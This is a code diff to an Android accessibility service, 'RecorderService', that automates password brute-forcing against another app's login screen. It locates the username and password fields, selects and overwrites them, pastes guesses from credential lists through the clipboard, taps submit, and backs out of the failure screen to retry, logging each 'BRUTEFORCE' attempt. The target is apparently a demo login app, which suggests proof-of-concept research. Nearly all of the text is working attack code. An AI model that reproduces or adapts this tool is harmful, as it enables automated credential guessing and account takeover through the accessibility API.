@@ -8,7 +8,7 @@ import android.accessibilityservice.AccessibilityServiceInfo;
 import android.content.ClipData;
 import android.content.ClipboardManager;
 import android.content.Context;
-import android.content.Intent;
+import android.os.Bundle;
 import android.util.Log;
 import android.view.accessibility.AccessibilityEvent;
 import android.view.accessibility.AccessibilityNodeInfo;
@@ -99,11 +99,7 @@ public class RecorderService extends AccessibilityService {
                 }
                 /* Else, if it is the failure activity, go back to our login activity */
                 else if(event.getClassName().equals(failureActivityName)){
-                    Intent intent = new Intent();
-                    intent.setAction(Intent.ACTION_VIEW);
-                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-                    intent.setClassName("com.example.LoginDemo", "com.example.LoginDemo.MyActivity");
-                    startActivity(intent);
+                    performGlobalAction(AccessibilityService.GLOBAL_ACTION_BACK);
 
                 }
                 /* Else, if it is the login activity, try logging in  */
@@ -113,7 +109,6 @@ public class RecorderService extends AccessibilityService {
 
             }
         }
-
 
         /* Enable the below code for logging all events */
         /*Log.v(TAG, String.format(
@@ -201,16 +196,28 @@ public class RecorderService extends AccessibilityService {
         if(usernode != null && passnode!= null && submitnode != null){
             ClipboardManager clipboard = (ClipboardManager) this.getSystemService(Context.CLIPBOARD_SERVICE);
 
+            /* Arguments to select the existing text, so that we can overwrite it */
+            Bundle arguments = new Bundle();
+            arguments.putInt(AccessibilityNodeInfo.ACTION_ARGUMENT_MOVEMENT_GRANULARITY_INT,
+                    AccessibilityNodeInfo.MOVEMENT_GRANULARITY_WORD);
+            arguments.putBoolean(AccessibilityNodeInfo.ACTION_ARGUMENT_EXTEND_SELECTION_BOOLEAN,
+                    true);
+
             /* Copy/Paste the username in to the user input field*/
+            usernode.performAction(AccessibilityNodeInfo.ACTION_PREVIOUS_AT_MOVEMENT_GRANULARITY,
+                    arguments);
+            usernode.performAction(AccessibilityNodeInfo.ACTION_FOCUS);
             ClipData clip = ClipData.newPlainText("label", usernames[userCount]);
             clipboard.setPrimaryClip(clip);
-            usernode.performAction(AccessibilityNodeInfo.ACTION_FOCUS);
             usernode.performAction(AccessibilityNodeInfo.ACTION_PASTE);
 
+
             /* Copy/Paste password in to password input field*/
+            passnode.performAction(AccessibilityNodeInfo.ACTION_PREVIOUS_AT_MOVEMENT_GRANULARITY,
+                    arguments);
+            passnode.performAction(AccessibilityNodeInfo.ACTION_FOCUS);
             clip = ClipData.newPlainText("label2", passwords[passCount]);
             clipboard.setPrimaryClip(clip);
-            passnode.performAction(AccessibilityNodeInfo.ACTION_FOCUS);
             passnode.performAction(AccessibilityNodeInfo.ACTION_PASTE);
 
             Log.d("BRUTEFORCE: Logging in with ", usernames[userCount] +" - "+ passwords[passCount] );
